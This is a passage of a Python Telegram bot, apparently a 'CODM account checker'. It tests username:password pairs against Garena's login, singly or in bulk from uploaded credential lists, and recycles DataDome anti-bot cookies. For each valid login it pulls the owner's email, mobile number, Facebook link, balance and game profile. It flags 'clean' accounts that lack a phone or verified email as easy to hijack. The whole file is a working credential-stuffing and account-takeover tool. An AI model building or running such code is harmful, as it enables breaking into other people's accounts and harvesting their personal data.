                "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                "x-requested-with": "XMLHttpRequest"
            }

            check_response = self.session.get(check_login_url, headers=check_headers, timeout=12)
            check_data = check_response.json()

            user_data = check_data.get("user", {})
            if user_data:
                region_code = user_data.get("region", "N/A")
                formatted_region = format_codm_region(region_code)
                return {
                    "codm_nickname": user_data.get("codm_nickname", "N/A"),
                    "codm_level": user_data.get("codm_level", "N/A"),
                    "region": formatted_region,
                    "region_code": region_code,
                    "uid": user_data.get("uid", "N/A"),
                    "open_id": user_data.get("open_id", "N/A"),
                    "t_open_id": user_data.get("t_open_id", "N/A")
                }
            return {}

        except Exception:
            return {}

    def _parse_account_details(self, data):
        """Parse account details from API response"""
        user_info = data.get('user_info', {})

        fb_username = "N/A"
        fb_uid = "N/A"
        if user_info.get('fb_account'):
            fb_username = user_info.get('fb_account', {}).get('fb_username', 'N/A')
            fb_uid = user_info.get('fb_account', {}).get('fb_uid', 'N/A')

        account_info = {
            'uid': user_info.get('uid', 'N/A'),
            'username': user_info.get('username', 'N/A'),
            'nickname': user_info.get('nickname', 'N/A'),
            'email': user_info.get('email', 'N/A'),
            'email_verified': bool(user_info.get('email_v', 0)),
            'security': {
                'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            },
            'personal': {
                'country': user_info.get('acc_country', 'N/A'),
                'country_code': user_info.get('country_code', 'N/A'),
                'mobile_no': user_info.get('mobile_no', 'N/A'),
            },
            'profile': {
                'shell_balance': user_info.get('shell', 0)
            },
            'facebook': {
                'fb_username': fb_username,
                'fb_uid': fb_uid
            }
        }

        mobile_no = account_info['personal']['mobile_no']
        email_verified = account_info['email_verified']
        mobile_is_na = (mobile_no == 'N/A' or not mobile_no or str(mobile_no).strip() == '')
        is_clean = mobile_is_na and not email_verified
        account_info['is_clean'] = is_clean

        return account_info

    def check_account(self, account: str, password: str, cookie_manager=None) -> Dict:
        """Main method to check a single account"""
        result = {
            'account': account,
            'password': password,
            'valid': False,
            'has_codm': False,
            'is_clean': False,
            'error': None,
            'details': {}
        }

        try:
            # Initialize session with cookies
            self._init_session(cookie_manager)

            # Step 1: Prelogin
            v1, v2 = self._prelogin(account)
            if not v1 or not v2:
                result['error'] = "Account doesn't exist or prelogin failed"
                return result

            # Step 2: Login
            sso_key = self._login(account, password, v1, v2)
            if not sso_key:
                result['error'] = "Invalid credentials"
                return result

            # Step 3: Get account details
            account_data = self._get_account_init()
            if not account_data:
                result['error'] = "Failed to fetch account details"
                return result

            if 'user_info' in account_data:
                details = self._parse_account_details(account_data)
            else:
                details = self._parse_account_details({'user_info': account_data})

            result['details'] = details
            result['valid'] = True
            result['is_clean'] = details.get('is_clean', False)

            # Step 4: Check CODM
            has_codm, codm_info = self._check_codm_account()
            result['has_codm'] = has_codm
            if has_codm and codm_info:
                result['codm_info'] = codm_info

            # Save fresh datadome if we got one
            if self.datadome_manager and cookie_manager:
                fresh_datadome = self.datadome_manager.extract_datadome_from_session(self.session)
                if fresh_datadome:
                    cookie_manager.save_cookie(fresh_datadome)

            return result

        except Exception as e:
            logger.error(f"Account check error for {account}: {e}")
            result['error'] = str(e)
            return result

    def _check_codm_account(self):
        """Check if account has CODM"""
        has_codm = False
        codm_info = {}

        try:
            code = self._get_codm_grant_code()
            if not code:
                return has_codm, codm_info

            access_token = self._token_exchange(code)
            if not access_token:
                return has_codm, codm_info

            codm_token, status = self._process_codm_callback(access_token)

            if status == "no_codm":
                return has_codm, codm_info
            elif status != "success" or not codm_token:
                return has_codm, codm_info

            codm_info = self._get_codm_user_info(codm_token)
            if codm_info:
                has_codm = True

        except Exception:
            pass

        return has_codm, codm_info

# ==================== TELEGRAM BOT HANDLERS ====================
checker = CODMChecker()
cookie_manager = CookieManager()

def get_main_menu_keyboard() -> InlineKeyboardMarkup:
    keyboard = [
        [InlineKeyboardButton("🎯 Single Check", callback_data="single_check")],
    ]
    
    # Only add Bulk Check button if enabled
    if BULK_CHECK_ENABLED:
        keyboard.append([InlineKeyboardButton("📦 Bulk Check", callback_data="bulk_check")])
    
    keyboard.append([InlineKeyboardButton("📊 Stats", callback_data="stats")])
    keyboard.append([InlineKeyboardButton("ℹ️ About", callback_data="about")])
    
    return InlineKeyboardMarkup(keyboard)

def format_account_result(result: Dict) -> str:
    if result.get('error'):
        return f"""❌ <b>Invalid Account</b>

<b>Account:</b> <code>{result['account']}</code>
<b>Error:</b> {result['error']}

👤 Owner: {OWNER_USERNAME}"""

    details = result.get('details', {})
    personal = details.get('personal', {})
    profile = details.get('profile', {})
    codm_info = result.get('codm_info', {})
    has_codm = result.get('has_codm', False)
    is_clean = result.get('is_clean', False)

    mobile_no = personal.get('mobile_no', 'N/A')
    country_code = personal.get('country_code', 'N/A')
    formatted_mobile = format_mobile_number(mobile_no, country_code)

    email = details.get('email', 'N/A')
    email_verified = details.get('email_verified', False)
    if email and email != 'N/A' and '@' in email:
        verification_status = "✅ Verified" if email_verified else "❌ Not Verified"
        email_display = f"{email} ({verification_status})"
    else:
        email_display = "N/A"

    fb_username = details.get('facebook', {}).get('fb_username', 'N/A')
    fb_uid = details.get('facebook', {}).get('fb_uid', 'N/A')
    if fb_uid and fb_uid != 'N/A':
        fb_link = f"https://www.facebook.com/profile.php?id={fb_uid}"
        if fb_username and fb_username != 'N/A':
            fb_status = "🔗 Connected"
            fb_display = f"{fb_username} ({fb_link})"
        else:
            fb_status = "⚠️ FB Unbound/Deleted"
            fb_display = fb_link
    else:
        fb_status = "❌ Not Connected"
        fb_display = "N/A"

    status_emoji = "✅" if is_clean else "⚠️"
    status_text = "CLEAN" if is_clean else "NOT CLEAN"

    message = f"""{status_emoji} <b>Account Status: {status_text}</b>

<b>📋 Account Details</b>
<b>Username:</b> {details.get('username', 'N/A')}
<b>Nickname:</b> {details.get('nickname', 'N/A')}
<b>UID:</b> {details.get('uid', 'N/A')}
<b>Country:</b> {personal.get('country', 'N/A')}
<b>Shell Balance:</b> {profile.get('shell_balance', 0)}

<b>📧 Contact</b>
<b>Email:</b> {email_display}
<b>Mobile:</b> {formatted_mobile}

<b>👤 Facebook</b>
<b>Status:</b> {fb_status}
<b>Info:</b> {fb_display}

<b>🎮 CODM</b>
<b>Has CODM:</b> {'✅ Yes' if has_codm else '❌ No'}"""

    if has_codm and codm_info:
        message += f"""
<b>CODM Level:</b> {codm_info.get('codm_level', 'N/A')}
<b>CODM Region:</b> {codm_info.get('region', 'N/A')}
<b>CODM IGN:</b> {codm_info.get('codm_nickname', 'N/A')}
<b>CODM UID:</b> {codm_info.get('uid', 'N/A')}"""

    message += f"""

👤 Owner: {OWNER_USERNAME}"""

    return message

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    welcome_message = f"""🎮 <b>Welcome to {BOT_NAME}!</b>

I can help you check Call of Duty: Mobile (CODM) account statistics and validity.

<b>🔍 Features:</b>
• Single account check
• Detailed account information
• CODM game data retrieval

<b>👤 Owner:</b> {OWNER_USERNAME}

Use the buttons below to get started!"""

    await update.message.reply_text(
        welcome_message,
        reply_markup=get_main_menu_keyboard(),
        parse_mode='HTML'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    if query.data == "single_check":
        await query.message.reply_text(
            "🔍 <b>Single Account Check</b>\n\n"
            "Please send me the account credentials in this format:\n"
            "<code>username:password</code>\n\n"
            "Or send the username first, then the password separately.\n\n"
            "Type <b>/cancel</b> to cancel.",
            parse_mode='HTML'
        )
        context.user_data['check_mode'] = 'single'
        return SINGLE_CHECK_ACCOUNT

    elif query.data == "bulk_check":
        # Check if bulk check is enabled
        if not BULK_CHECK_ENABLED:
            await query.message.reply_text(
                BULK_CHECK_MESSAGE,
                parse_mode='HTML'
            )
            await query.message.reply_text(
                "🏠 <b>Main Menu</b>",
                reply_markup=get_main_menu_keyboard(),
                parse_mode='HTML'
            )
            return ConversationHandler.END
        
        await query.message.reply_text(
            "📦 <b>Bulk Account Check</b>\n\n"
            "Please upload a <b>text file (.txt)</b> containing account credentials.\n"
            "Each line should be in the format:\n"
            "<code>username:password</code>\n\n"
            "Type <b>/cancel</b> to cancel.",
            parse_mode='HTML'
        )
        context.user_data['check_mode'] = 'bulk'
        return BULK_CHECK_FILE

    elif query.data == "stats":
        await query.message.reply_text(
            "📊 <b>Statistics</b>\n\n"
            "📈 Total accounts checked: 0\n"
            "✅ Valid accounts: 0\n"
            "❌ Invalid accounts: 0\n"
            "🎮 CODM accounts found: 0\n\n"
            "⏰ Last check: Never\n\n"
            "👤 Owner: " + OWNER_USERNAME,
            parse_mode='HTML'
        )

    elif query.data == "about":
        about_message = f"""ℹ️ <b>About {BOT_NAME}</b>

🎮 <b>CODM Account Checker Bot</b>

This bot allows you to check Call of Duty: Mobile account validity and retrieve detailed account information including:
• Account status (Clean/Not Clean)
• CODM level and IGN
• CODM region
• Email and mobile verification status
• Facebook connection status
• Garena Shell balance

<b>⚙️ Technical Details</b>
• Uses Garena SSO API
• Supports automatic DataDome handling
• Real-time account validation

<b>👤 Developer:</b> {OWNER_USERNAME}
<b>📅 Version:</b> 6.9.TAYO

<i>For support or issues, contact the developer.</i>"""

        await query.message.reply_text(
            about_message,
            parse_mode='HTML'
        )

    await query.message.reply_text(
        "🏠 <b>Main Menu</b>",
        reply_markup=get_main_menu_keyboard(),
        parse_mode='HTML'
    )

    return ConversationHandler.END

async def single_check_account(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = update.message.text
    if ':' in text:
        account, password = text.split(':', 1)
        context.user_data['account'] = account.strip()
        context.user_data['password'] = password.strip()
        await process_single_check(update, context)
        return ConversationHandler.END
    else:
        context.user_data['account'] = text.strip()
        await update.message.reply_text(
            f"📝 Account: <code>{context.user_data['account']}</code>\n\n"
            "Now please send me the <b>password</b> for this account.",
            parse_mode='HTML'
        )
        return SINGLE_CHECK_PASSWORD

async def single_check_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['password'] = update.message.text.strip()
    await process_single_check(update, context)
    return ConversationHandler.END

async def process_single_check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    account = context.user_data.get('account')
    password = context.user_data.get('password')

    if not account or not password:
        await update.message.reply_text(
            "❌ <b>Error</b>\n\n"
            "Account or password missing. Please start over with /start.",
            parse_mode='HTML'
        )
        return

    processing_msg = await update.message.reply_text(
        f"⏳ <b>Checking account...</b>\n\n"
        f"📝 <code>{account}</code>\n\n"
        "Please wait, this may take a few seconds...",
        parse_mode='HTML'
    )

    try:
        result = checker.check_account(account, password, cookie_manager)
        result_message = format_account_result(result)

        await processing_msg.edit_text(
            result_message,
            parse_mode='HTML'
        )

        await update.message.reply_text(
            "🏠 <b>Main Menu</b>",
            reply_markup=get_main_menu_keyboard(),
            parse_mode='HTML'
        )

    except Exception as e:
        await processing_msg.edit_text(
            f"❌ <b>Error during check</b>\n\n"
            f"An error occurred: {str(e)}\n\n"
            f"Please try again later.",
            parse_mode='HTML'
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    # Check if bulk check is enabled
    if not BULK_CHECK_ENABLED:
        await update.message.reply_text(
            BULK_CHECK_MESSAGE,
            parse_mode='HTML'
        )
        await update.message.reply_text(
            "🏠 <b>Main Menu</b>",
            reply_markup=get_main_menu_keyboard(),
            parse_mode='HTML'
        )
        return ConversationHandler.END
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            "❌ <b>Invalid file format</b>\n\n"
            "Please upload a <b>.txt</b> file with account credentials.",
            parse_mode='HTML'
        )
        return BULK_CHECK_FILE

    file = await context.bot.get_file(document.file_id)
    file_path = f"bulk_{document.file_name}"

    try:
        await file.download_to_drive(file_path)

        accounts = []
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                account, password = clean_account_line(line)
                if account and password:
                    accounts.append((account, password))

        if not accounts:
            await update.message.reply_text(
                "❌ <b>No valid accounts found</b>\n\n"
                "The file doesn't contain any valid account:password pairs.",
                parse_mode='HTML'
            )
            os.remove(file_path)
            return ConversationHandler.END

        processing_msg = await update.message.reply_text(
            f"📦 <b>Processing {len(accounts)} accounts...</b>\n\n"
            "⏳ This may take a while depending on the number of accounts.",
            parse_mode='HTML'
        )

        results = []
        processed = 0
        valid_count = 0
        invalid_count = 0
        codm_count = 0

        for account, password in accounts[:100]:
            try:
                result = checker.check_account(account, password, cookie_manager)
                results.append(result)
                processed += 1
                if result.get('valid'):
                    valid_count += 1
                    if result.get('has_codm'):
                        codm_count += 1
                else:
                    invalid_count += 1

                if processed % 5 == 0:
                    await processing_msg.edit_text(
                        f"📦 <b>Processing accounts...</b>\n\n"
                        f"Progress: {processed}/{len(accounts[:100])}\n"
                        f"✅ Valid: {valid_count}\n"
                        f"❌ Invalid: {invalid_count}\n"
                        f"🎮 CODM: {codm_count}\n\n"
                        "⏳ Please wait...",
                        parse_mode='HTML'
                    )
            except Exception:
                invalid_count += 1

        report = f"""📊 <b>Bulk Check Results</b>

📝 <b>Total Processed:</b> {processed}
✅ <b>Valid Accounts:</b> {valid_count}
❌ <b>Invalid Accounts:</b> {invalid_count}
🎮 <b>CODM Accounts:</b> {codm_count}
🔍 <b>Clean Accounts:</b> {len([r for r in results if r.get('is_clean')])}

📋 <b>Valid Accounts:</b>
"""
        valid_accounts = [r for r in results if r.get('valid')]
        if valid_accounts:
            for r in valid_accounts[:10]:
                report += f"\n• <code>{r['account']}</code>"
                if r.get('has_codm'):
                    codm_lvl = r.get('codm_info', {}).get('codm_level', 'N/A')
                    report += f" (CODM Lv.{codm_lvl})"
            if len(valid_accounts) > 10:
                report += f"\n\n... and {len(valid_accounts) - 10} more"

        report += f"\n\n👤 Owner: {OWNER_USERNAME}"

        os.remove(file_path)

        await processing_msg.edit_text(
            report,
            parse_mode='HTML'
        )

        await update.message.reply_text(
            "🏠 <b>Main Menu</b>",
            reply_markup=get_main_menu_keyboard(),
            parse_mode='HTML'
        )

    except Exception as e:
        await update.message.reply_text(
            f"❌ <b>Error processing file</b>\n\n"
            f"An error occurred: {str(e)}\n\n"
            "Please try again.",
            parse_mode='HTML'
        )
        if os.path.exists(file_path):
            os.remove(file_path)

    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "❌ <b>Operation cancelled</b>\n\n"
        "Returning to main menu.",
        reply_markup=get_main_menu_keyboard(),
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error(f"Update {update} caused error {context.error}")
    if update and update.message:
        await update.message.reply_text(
            "❌ <b>An error occurred</b>\n\n"
            "Please try again later or contact the developer.",
            parse_mode='HTML'
        )

def main():
    """Start the bot."""
    application = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(button_handler, pattern="single_check"),
            CallbackQueryHandler(button_handler, pattern="bulk_check"),
        ],
        states={
            SINGLE_CHECK_ACCOUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, single_check_account),
            ],
            SINGLE_CHECK_PASSWORD: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, single_check_password),
            ],
            BULK_CHECK_FILE: [
                MessageHandler(filters.Document.ALL, handle_document),
            ],
        },
        fallbacks=[
            CommandHandler("cancel", cancel),
            CommandHandler("start", start),
            CallbackQueryHandler(button_handler),
        ],
        per_message=False,
        per_chat=True,
        per_user=True,
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(button_handler, pattern="stats"))
    application.add_handler(CallbackQueryHandler(button_handler, pattern="about"))
    application.add_error_handler(error_handler)

    print(f"🤖 Starting {BOT_NAME}...")
    print(f"👤 Owner: {OWNER_USERNAME}")
    print(f"📦 Bulk Check: {'✅ ENABLED' if BULK_CHECK_ENABLED else '❌ DISABLED'}")
    print("✅ Bot is running!")

    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
